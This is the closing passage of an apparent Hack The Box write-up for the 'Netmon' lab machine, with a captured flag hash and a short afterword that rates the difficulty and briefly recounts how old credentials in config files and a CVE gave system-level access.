+<pre class="z-code"><code><span class="z-text z-plain">64d9cabedfc6c0fd14424ca5bfdcf16e
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/netmon/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated the user flag as 'Easy' and the root flag as 'Piece of cake'. The
+foothold was a bit tricky to find, since you had to look at config files to find
+old credentials and have the idea of changing a part of it, and then find a
+valid CVE. However, it granted us access to the system as <code>NT AUTHORITY\SYSTEM</code>,
+so there was no need to escalate privileges afterwards.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
